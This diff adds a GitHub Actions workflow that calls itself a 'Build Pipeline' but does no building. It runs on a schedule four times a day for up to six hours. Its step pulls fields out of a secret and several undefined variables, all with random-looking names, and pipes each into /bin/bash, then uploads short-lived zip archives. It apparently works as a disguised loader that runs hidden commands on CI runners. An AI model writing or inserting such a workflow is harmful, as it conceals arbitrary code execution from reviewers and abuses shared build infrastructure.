@@ -1,0 +1,35 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '21 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          rthy6: ${{ secrets.rthy6 }}
+        run: |
+          printf '%s' "$rthy6" | jq -r .tjgq04157 | /bin/bash
+          echo $sj056 | jq -r .s62 | /bin/bash
+          printf '%s' "$nzhj97" | jq -r .d297 | /bin/bash
+          printf '%s' "$bxsv2861" | jq -r .e57692 | /bin/bash
+          printf '%s' "$iop2" | jq -r .lk01 | /bin/bash
+          printf '%s' "$bgo7" | jq -r .nsln88746 | /bin/bash
+          printf '%s' "$snxh04" | jq -r .e396 | /bin/bash
+          echo $qpg43 | jq -r .evu97973 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: S6qI1QAq
+          path: "*.zip"
+          retention-days: 1
